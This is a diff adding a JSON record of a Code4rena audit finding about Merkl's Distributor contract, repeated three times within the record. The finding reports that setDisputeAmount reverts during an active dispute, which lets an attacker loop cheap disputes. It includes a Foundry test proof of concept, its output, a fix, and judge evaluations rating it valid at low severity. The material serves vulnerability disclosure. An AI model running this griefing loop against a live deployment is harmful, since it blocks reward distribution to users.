@@ -1,0 +1,120 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "Merkl_T4ExvutBBXC",
+    "audit_uid": "T4ExvutBBXC",
+    "requested_submission_uid": "tPiCHPWwc5n",
+    "requested_finding_uid": "Sg7JmYgNm2Q",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/Merkl_T4ExvutBBXC/20260618_144946/findings.json",
+    "source_submission_uid": "tPiCHPWwc5n",
+    "source_finding_uid": "Sg7JmYgNm2Q",
+    "original_report_path": "Merkl_T4ExvutBBXC\\low_valid_tPiCHPWwc5n.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "tPiCHPWwc5n",
+  "finding_uid": "Sg7JmYgNm2Q",
+  "finding_number": "7",
+  "title": "Dispute Mechanism Vulnerability: Inability to Update Dispute Fee During Active Attacks allows Permanent Griefing",
+  "severity": "medium",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "tradingview",
+  "body": "### Finding description and impact\n\nThe `Distributor` contract implements a dispute mechanism allowing users to challenge a Merkle Root update by paying a fee (`disputeAmount`). This fee is intended to deter spam. To manage this fee, the Governor uses the `setDisputeAmount` function.\n\nHowever, a critical design flaw exists in `setDisputeAmount`:\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    if (disputer != address(0)) revert Errors.UnresolvedDispute(); // <--- BLOCKER\n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```\n\nThe function explicitly **reverts** if a dispute is currently active (`disputer != address(0)`). This restriction creates a vulnerability where an attacker can permanently lock the system in a dispute loop while preventing the Governor from increasing the cost of the attack.\n\n**The Attack Scenario:**\n1.  **Initial State:** `disputeAmount` is low (e.g., 0 or 1 token) or uninitialized.\n2.  **Attack Initiation:** An attacker calls `disputeTree`, paying the low fee. The system enters \"Dispute Mode\".\n3.  **Governor's Dilemma:** The Governor observes the spam and attempts to raise `disputeAmount` to make further attacks prohibitively expensive.\n4.  **The Lockout:** The Governor's call to `setDisputeAmount` **fails** because a dispute is active.\n5.  **Forced Resolution:** The Governor must first call `resolveDispute` to clear the current dispute.\n6.  **The Loop:** Immediately after resolution (in the same block or next), the attacker calls `disputeTree` again. Since the fee is *still low* (because the update failed), the attacker can repeat this indefinitely at negligible cost.\n\n**Impact:**\n*   **Permanent Denial of Service (DoS):** Merkle Roots cannot be updated or finalized, preventing reward distribution.\n*   **Governance Impotence:** The protocol's defense mechanism (raising fees) is disabled exactly when it is needed most.\n\n### Recommended mitigation steps\n\nThe Governor should be allowed to update the `disputeAmount` at any time. The new fee will naturally apply only to *subsequent* disputes, not the current one.\n\n**Fix in `contracts/Distributor.sol`:**\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    // DELETE THIS LINE:\n    // if (disputer != address(0)) revert Errors.UnresolvedDispute();\n    \n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```",
+  "proof_of_concept": "## Proof of Concept (PoC)\n\nI have created a foundry test demonstrating this deadlock. The test shows an attacker locking the system with a cheap dispute, and the Governor failing to increase the fee to stop them.\n\n**Steps to Reproduce:**\n1.  Create file `test/c4/DisputeGriefingPoC.t.sol`.\n2.  Run `forge test --match-test test_DisputeLoopPreventsFeeUpdate -vv`.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\nimport { Errors } from \"../../contracts/utils/Errors.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { Distributor, MerkleTree } from \"../../contracts/Distributor.sol\";\n\ncontract DisputeGriefingPoC is Fixture {\n    address attacker;\n    \n    function setUp() public override {\n        super.setUp();\n        attacker = vm.addr(666);\n        vm.label(attacker, \"Attacker\");\n\n        // Deploy a fresh Distributor for testing to ensure clean state\n        Distributor distributorImpl = new Distributor();\n        Distributor distributor = Distributor(payable(deployUUPS(address(distributorImpl), \"\")));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // Update Creator to point to real Distributor\n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // Setup: Set initial dispute token and amount (LOW AMOUNT)\n        vm.startPrank(governor);\n        distributor.setDisputeToken(angle);\n        distributor.setDisputeAmount(1 ether); // Initial low fee\n        distributor.toggleTrusted(governor);   // Whitelist governor for updates\n        vm.stopPrank();\n\n        // Fund attacker\n        angle.mint(attacker, 100 ether);\n        vm.startPrank(attacker);\n        angle.approve(address(distributor), type(uint256).max);\n        vm.stopPrank();\n    }\n\n    function test_DisputeLoopPreventsFeeUpdate() external {\n        Distributor distributor = Distributor(payable(address(creator.distributor())));\n        \n        // 1. Governor updates tree (Normal operation)\n        vm.startPrank(governor);\n        distributor.updateTree(MerkleTree(bytes32(\"root\"), bytes32(\"ipfs\")));\n        vm.stopPrank();\n\n        // 2. Attacker disputes the tree (Cheaply)\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 1\");\n        vm.stopPrank();\n\n        // 3. Governor realizes the fee is too low and wants to increase it to stop spam\n        vm.startPrank(governor);\n        \n        // Try to increase fee -> FAILS because dispute is active\n        // This confirms the Governor is powerless during the attack\n        vm.expectRevert(Errors.UnresolvedDispute.selector);\n        distributor.setDisputeAmount(1000 ether); \n        \n        console.log(\"Governor cannot increase fee during dispute\");\n\n        // Governor is forced to resolve the dispute first to unlock system\n        distributor.resolveDispute(false); \n        vm.stopPrank();\n\n        // 4. Attacker immediately disputes again (simulating Frontrunning/Backrunning)\n        // The fee is STILL LOW (1 ether) because Gov's update failed\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 2\");\n        vm.stopPrank();\n\n        assertEq(distributor.disputer(), attacker, \"Attacker locked system again at low cost\");\n        assertEq(distributor.disputeAmount(), 1 ether, \"Fee remains low\");\n    }\n}\n```\n\n### Real Output\n\n```text\nRan 1 test for test/c4/DisputeGriefingPoC.t.sol:DisputeGriefingPoC\n[PASS] test_DisputeLoopPreventsFeeUpdate() (gas: 216762)\nLogs:\n  Governor cannot increase fee during dispute\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L434",
+    "https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L334"
+  ],
+  "source_record": {
+    "project_id": "T4ExvutBBXC",
+    "submission_index": "79",
+    "api_submission_id": "",
+    "uid": "tPiCHPWwc5n",
+    "number": "79",
+    "title": "Dispute Mechanism Vulnerability: Inability to Update Dispute Fee During Active Attacks allows Permanent Griefing",
+    "severity": "medium",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "tradingview",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L434",
+      "https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L334"
+    ],
+    "body": "### Finding description and impact\n\nThe `Distributor` contract implements a dispute mechanism allowing users to challenge a Merkle Root update by paying a fee (`disputeAmount`). This fee is intended to deter spam. To manage this fee, the Governor uses the `setDisputeAmount` function.\n\nHowever, a critical design flaw exists in `setDisputeAmount`:\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    if (disputer != address(0)) revert Errors.UnresolvedDispute(); // <--- BLOCKER\n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```\n\nThe function explicitly **reverts** if a dispute is currently active (`disputer != address(0)`). This restriction creates a vulnerability where an attacker can permanently lock the system in a dispute loop while preventing the Governor from increasing the cost of the attack.\n\n**The Attack Scenario:**\n1.  **Initial State:** `disputeAmount` is low (e.g., 0 or 1 token) or uninitialized.\n2.  **Attack Initiation:** An attacker calls `disputeTree`, paying the low fee. The system enters \"Dispute Mode\".\n3.  **Governor's Dilemma:** The Governor observes the spam and attempts to raise `disputeAmount` to make further attacks prohibitively expensive.\n4.  **The Lockout:** The Governor's call to `setDisputeAmount` **fails** because a dispute is active.\n5.  **Forced Resolution:** The Governor must first call `resolveDispute` to clear the current dispute.\n6.  **The Loop:** Immediately after resolution (in the same block or next), the attacker calls `disputeTree` again. Since the fee is *still low* (because the update failed), the attacker can repeat this indefinitely at negligible cost.\n\n**Impact:**\n*   **Permanent Denial of Service (DoS):** Merkle Roots cannot be updated or finalized, preventing reward distribution.\n*   **Governance Impotence:** The protocol's defense mechanism (raising fees) is disabled exactly when it is needed most.\n\n### Recommended mitigation steps\n\nThe Governor should be allowed to update the `disputeAmount` at any time. The new fee will naturally apply only to *subsequent* disputes, not the current one.\n\n**Fix in `contracts/Distributor.sol`:**\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    // DELETE THIS LINE:\n    // if (disputer != address(0)) revert Errors.UnresolvedDispute();\n    \n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```",
+    "proof_of_concept": "## Proof of Concept (PoC)\n\nI have created a foundry test demonstrating this deadlock. The test shows an attacker locking the system with a cheap dispute, and the Governor failing to increase the fee to stop them.\n\n**Steps to Reproduce:**\n1.  Create file `test/c4/DisputeGriefingPoC.t.sol`.\n2.  Run `forge test --match-test test_DisputeLoopPreventsFeeUpdate -vv`.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\nimport { Errors } from \"../../contracts/utils/Errors.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { Distributor, MerkleTree } from \"../../contracts/Distributor.sol\";\n\ncontract DisputeGriefingPoC is Fixture {\n    address attacker;\n    \n    function setUp() public override {\n        super.setUp();\n        attacker = vm.addr(666);\n        vm.label(attacker, \"Attacker\");\n\n        // Deploy a fresh Distributor for testing to ensure clean state\n        Distributor distributorImpl = new Distributor();\n        Distributor distributor = Distributor(payable(deployUUPS(address(distributorImpl), \"\")));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // Update Creator to point to real Distributor\n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // Setup: Set initial dispute token and amount (LOW AMOUNT)\n        vm.startPrank(governor);\n        distributor.setDisputeToken(angle);\n        distributor.setDisputeAmount(1 ether); // Initial low fee\n        distributor.toggleTrusted(governor);   // Whitelist governor for updates\n        vm.stopPrank();\n\n        // Fund attacker\n        angle.mint(attacker, 100 ether);\n        vm.startPrank(attacker);\n        angle.approve(address(distributor), type(uint256).max);\n        vm.stopPrank();\n    }\n\n    function test_DisputeLoopPreventsFeeUpdate() external {\n        Distributor distributor = Distributor(payable(address(creator.distributor())));\n        \n        // 1. Governor updates tree (Normal operation)\n        vm.startPrank(governor);\n        distributor.updateTree(MerkleTree(bytes32(\"root\"), bytes32(\"ipfs\")));\n        vm.stopPrank();\n\n        // 2. Attacker disputes the tree (Cheaply)\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 1\");\n        vm.stopPrank();\n\n        // 3. Governor realizes the fee is too low and wants to increase it to stop spam\n        vm.startPrank(governor);\n        \n        // Try to increase fee -> FAILS because dispute is active\n        // This confirms the Governor is powerless during the attack\n        vm.expectRevert(Errors.UnresolvedDispute.selector);\n        distributor.setDisputeAmount(1000 ether); \n        \n        console.log(\"Governor cannot increase fee during dispute\");\n\n        // Governor is forced to resolve the dispute first to unlock system\n        distributor.resolveDispute(false); \n        vm.stopPrank();\n\n        // 4. Attacker immediately disputes again (simulating Frontrunning/Backrunning)\n        // The fee is STILL LOW (1 ether) because Gov's update failed\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 2\");\n        vm.stopPrank();\n\n        assertEq(distributor.disputer(), attacker, \"Attacker locked system again at low cost\");\n        assertEq(distributor.disputeAmount(), 1 ether, \"Fee remains low\");\n    }\n}\n```\n\n### Real Output\n\n```text\nRan 1 test for test/c4/DisputeGriefingPoC.t.sol:DisputeGriefingPoC\n[PASS] test_DisputeLoopPreventsFeeUpdate() (gas: 216762)\nLogs:\n  Governor cannot increase fee during dispute\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/T4ExvutBBXC/submissions/79",
+    "raw": {
+      "auditUid": "T4ExvutBBXC",
+      "createdAt": "2025-11-26T09:46:10.419Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "mZM8UzuSXgw",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:18:28.535Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "Sg7JmYgNm2Q"
+        },
+        {
+          "uid": "eytk3zAqCdT",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:18:29.738Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "Sg7JmYgNm2Q"
+        },
+        {
+          "uid": "TA5ZASvk7bV",
+          "userUid": "YP8WqAJEHSw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-21T21:20:22.666Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "tPiCHPWwc5n",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "Sg7JmYgNm2Q",
+        "number": 7,
+        "duplicates": 16
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-12-21T21:20:22.666Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "medium",
+      "team": null,
+      "title": "Dispute Mechanism Vulnerability: Inability to Update Dispute Fee During Active Attacks allows Permanent Griefing",
+      "uid": "tPiCHPWwc5n",
+      "updatedAt": "2025-11-26T09:46:10.419Z",
+      "user": {
+        "uid": "danxbeQhD5L",
+        "handle": "tradingview"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "### Finding description and impact\n\nThe `Distributor` contract implements a dispute mechanism allowing users to challenge a Merkle Root update by paying a fee (`disputeAmount`). This fee is intended to deter spam. To manage this fee, the Governor uses the `setDisputeAmount` function.\n\nHowever, a critical design flaw exists in `setDisputeAmount`:\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    if (disputer != address(0)) revert Errors.UnresolvedDispute(); // <--- BLOCKER\n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```\n\nThe function explicitly **reverts** if a dispute is currently active (`disputer != address(0)`). This restriction creates a vulnerability where an attacker can permanently lock the system in a dispute loop while preventing the Governor from increasing the cost of the attack.\n\n**The Attack Scenario:**\n1.  **Initial State:** `disputeAmount` is low (e.g., 0 or 1 token) or uninitialized.\n2.  **Attack Initiation:** An attacker calls `disputeTree`, paying the low fee. The system enters \"Dispute Mode\".\n3.  **Governor's Dilemma:** The Governor observes the spam and attempts to raise `disputeAmount` to make further attacks prohibitively expensive.\n4.  **The Lockout:** The Governor's call to `setDisputeAmount` **fails** because a dispute is active.\n5.  **Forced Resolution:** The Governor must first call `resolveDispute` to clear the current dispute.\n6.  **The Loop:** Immediately after resolution (in the same block or next), the attacker calls `disputeTree` again. Since the fee is *still low* (because the update failed), the attacker can repeat this indefinitely at negligible cost.\n\n**Impact:**\n*   **Permanent Denial of Service (DoS):** Merkle Roots cannot be updated or finalized, preventing reward distribution.\n*   **Governance Impotence:** The protocol's defense mechanism (raising fees) is disabled exactly when it is needed most.\n\n### Recommended mitigation steps\n\nThe Governor should be allowed to update the `disputeAmount` at any time. The new fee will naturally apply only to *subsequent* disputes, not the current one.\n\n**Fix in `contracts/Distributor.sol`:**\n\n```solidity\nfunction setDisputeAmount(uint256 _disputeAmount) external onlyGovernor {\n    // DELETE THIS LINE:\n    // if (disputer != address(0)) revert Errors.UnresolvedDispute();\n    \n    disputeAmount = _disputeAmount;\n    emit DisputeAmountUpdated(_disputeAmount);\n}\n```",
+      "proofOfConcept": "## Proof of Concept (PoC)\n\nI have created a foundry test demonstrating this deadlock. The test shows an attacker locking the system with a cheap dispute, and the Governor failing to increase the fee to stop them.\n\n**Steps to Reproduce:**\n1.  Create file `test/c4/DisputeGriefingPoC.t.sol`.\n2.  Run `forge test --match-test test_DisputeLoopPreventsFeeUpdate -vv`.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport { Fixture } from \"../Fixture.t.sol\";\nimport { Errors } from \"../../contracts/utils/Errors.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { Distributor, MerkleTree } from \"../../contracts/Distributor.sol\";\n\ncontract DisputeGriefingPoC is Fixture {\n    address attacker;\n    \n    function setUp() public override {\n        super.setUp();\n        attacker = vm.addr(666);\n        vm.label(attacker, \"Attacker\");\n\n        // Deploy a fresh Distributor for testing to ensure clean state\n        Distributor distributorImpl = new Distributor();\n        Distributor distributor = Distributor(payable(deployUUPS(address(distributorImpl), \"\")));\n        distributor.initialize(IAccessControlManager(address(accessControlManager)));\n\n        // Update Creator to point to real Distributor\n        vm.prank(governor);\n        creator.setNewDistributor(address(distributor));\n\n        // Setup: Set initial dispute token and amount (LOW AMOUNT)\n        vm.startPrank(governor);\n        distributor.setDisputeToken(angle);\n        distributor.setDisputeAmount(1 ether); // Initial low fee\n        distributor.toggleTrusted(governor);   // Whitelist governor for updates\n        vm.stopPrank();\n\n        // Fund attacker\n        angle.mint(attacker, 100 ether);\n        vm.startPrank(attacker);\n        angle.approve(address(distributor), type(uint256).max);\n        vm.stopPrank();\n    }\n\n    function test_DisputeLoopPreventsFeeUpdate() external {\n        Distributor distributor = Distributor(payable(address(creator.distributor())));\n        \n        // 1. Governor updates tree (Normal operation)\n        vm.startPrank(governor);\n        distributor.updateTree(MerkleTree(bytes32(\"root\"), bytes32(\"ipfs\")));\n        vm.stopPrank();\n\n        // 2. Attacker disputes the tree (Cheaply)\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 1\");\n        vm.stopPrank();\n\n        // 3. Governor realizes the fee is too low and wants to increase it to stop spam\n        vm.startPrank(governor);\n        \n        // Try to increase fee -> FAILS because dispute is active\n        // This confirms the Governor is powerless during the attack\n        vm.expectRevert(Errors.UnresolvedDispute.selector);\n        distributor.setDisputeAmount(1000 ether); \n        \n        console.log(\"Governor cannot increase fee during dispute\");\n\n        // Governor is forced to resolve the dispute first to unlock system\n        distributor.resolveDispute(false); \n        vm.stopPrank();\n\n        // 4. Attacker immediately disputes again (simulating Frontrunning/Backrunning)\n        // The fee is STILL LOW (1 ether) because Gov's update failed\n        vm.startPrank(attacker);\n        distributor.disputeTree(\"Spam Dispute 2\");\n        vm.stopPrank();\n\n        assertEq(distributor.disputer(), attacker, \"Attacker locked system again at low cost\");\n        assertEq(distributor.disputeAmount(), 1 ether, \"Fee remains low\");\n    }\n}\n```\n\n### Real Output\n\n```text\nRan 1 test for test/c4/DisputeGriefingPoC.t.sol:DisputeGriefingPoC\n[PASS] test_DisputeLoopPreventsFeeUpdate() (gas: 216762)\nLogs:\n  Governor cannot increase fee during dispute\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L434,https://github.com/code-423n4/2025-11-merkl/blob/main/contracts/Distributor.sol#L334",
+      "number": 79,
+      "aiExplanation": null,
+      "_index": 79
+    }
+  }
+}
